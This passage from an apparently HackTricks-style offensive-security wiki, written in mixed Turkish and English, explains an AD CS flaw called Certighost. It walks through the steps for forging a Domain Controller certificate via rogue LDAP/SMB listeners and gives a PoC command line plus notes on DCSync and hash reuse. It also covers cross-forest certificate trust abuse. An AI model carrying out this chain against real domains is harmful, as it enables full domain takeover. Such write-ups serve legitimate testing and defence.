CA, **returned identity'yi authenticated callback principal'a cryptographically bind etmezse**, session attacker-controlled machine account olarak authenticate olmuş olsa bile **Domain Controller** için certificate issue edebilir. Bu durum bug'ı kavramsal olarak **Certifried**'dan farklı kılar: Attacker, `dNSHostName` gibi AD attributes değerlerini yeniden yazmak yerine **CA callback resolution sırasında identity data'yı substitute eder**.<sup>[[2]](#references)</sup>

**Useful preconditions:**

- Düşük yetkili **domain credentials**
- Bir computer account oluşturma veya yeniden kullanma yeteneği
- **CA**'den attacker-controlled **`389`** ve **`445`** portlarına network reachability
- Vulnerable / unpatched CA request path (**July 14, 2026** Microsoft update'i **`cdc` için DC validation** ve ayrıca **resolved-SID comparison** ekledi)

Ortaya çıkan **`.pfx`**, daha sonra **PKINIT** için kullanılabilir; bu işlem bir **`.ccache`** ve published PoC flow'da **target DC NT hash** üretir. Bu sonuç genellikle **full domain compromise** için yeterlidir.

### Abuse

Public PoC, full chain'i otomatikleştirir:<sup>[[1]](#references)</sup>

1. Attacker-controlled bir **machine account** oluşturun veya yeniden kullanın.
2. `389` ve `445` üzerinde **rogue LDAP and SMB/LSA listeners** başlatın.
3. Attacker-controlled **`cdc`** ve target **`rmd`** attributes değerlerini içeren bir certificate request gönderin.
4. CA'nın controlled machine account olarak rogue listeners'a authenticate olmasını bekleyin; identity lookups yanıtlarında ise **target DC** attributes değerlerini döndürün.
5. CA-signed bir **DC certificate** alın ve ardından bunu **PKINIT** için kullanın.
```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```
PoC'deki kullanışlı runtime flag'leri:

- `--listener <ip>`: `cdc` içinde duyurulan callback IP'sini açıkça seçer
- `--computer-name <NAME$>`: yeni bir hesap oluşturmak yerine mevcut bir machine account'u yeniden kullanır

**Operasyonel notlar:**

- PoC'nin **root** ile çalıştırılması gerekir; çünkü **privileged ports** olan `389` ve `445` portlarına bind eder.
- Başarılı exploitation sonucunda yerel olarak bir **DC `.pfx`** ve **Kerberos `.ccache`** yazılır.
- Certificate bir **Domain Controller account** ile eşlendiğinden, sonraki işlemler arasında **certificate-based Kerberos auth**, **DCSync** ve kurtarılan **machine NT hash** değerinin yeniden kullanılması bulunabilir.<sup>[[2]](#references)</sup>

## Certificates ile Forest'ların Ele Geçirilmesinin Passive Voice ile Açıklanması

### Compromised CA'ler ile Forest Trust'larının Kırılması

**Cross-forest enrollment** yapılandırması nispeten kolaylaştırılmıştır. Resource forest'taki **root CA certificate**, yöneticiler tarafından **account forest'larına publish edilir** ve resource forest'taki **enterprise CA** certificate'ları, her account forest'taki **`NTAuthCertificates` ve AIA container'larına eklenir**. Açıklamak gerekirse bu düzenleme, resource forest'taki **CA'ye**, PKI'sını yönettiği diğer tüm forest'lar üzerinde tam kontrol sağlar. Bu CA'nın **attackers tarafından compromised edilmesi** durumunda, hem resource forest'taki hem de account forest'larındaki tüm kullanıcılar için certificate'lar **onlar tarafından forge edilebilir** ve böylece forest'ın güvenlik sınırı kırılabilir.<sup>[[6]](#references)</sup>

### Foreign Principal'lara Verilen Enrollment Privileges

Multi-forest ortamlarında, **Authenticated Users veya foreign principal'lar** (Enterprise CA'nın ait olduğu forest'ın dışındaki kullanıcılar/gruplar) için **enrollment ve edit rights** sağlayan **certificate template'larını publish eden** Enterprise CA'ler konusunda dikkatli olunması gerekir.\
Bir trust üzerinden authentication gerçekleştirildiğinde, **Authenticated Users SID**, AD tarafından kullanıcının token'ına eklenir. Bu nedenle bir domain'de **Authenticated Users'a enrollment rights sağlayan** bir template'e sahip Enterprise CA bulunuyorsa, bu template potansiyel olarak **farklı bir forest'taki bir kullanıcı tarafından enroll edilebilir**. Benzer şekilde, bir template tarafından **enrollment rights açıkça bir foreign principal'a veriliyorsa**, bir **cross-forest access-control relationship oluşturulur** ve bir forest'taki bir principal'ın **başka bir forest'taki template'e enroll olması** mümkün hale gelir.

Her iki senaryo da bir forest'tan diğerine **attack surface'in artmasına** yol açar. Certificate template'ının ayarları, bir foreign domain'de ek privileges elde etmek için attacker tarafından exploit edilebilir.<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 PoC repository](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - Certighost technical analysis](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: Abusing Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, BloodHound GUI, New Authentication and Request Methods and more](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – The Tale of Enhanced Key (mis)Usage](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – Relaying to AD Certificate Services over RPC](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: Shell access to ADCS CA with YubiHSM](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – ADCS ESC13 Abuse Technique](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – Privilege Escalation (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: Not Just Another AD CS ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: Misconfiguration and Exploitation](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)

{{#include ../../../banners/hacktricks-training.md}}
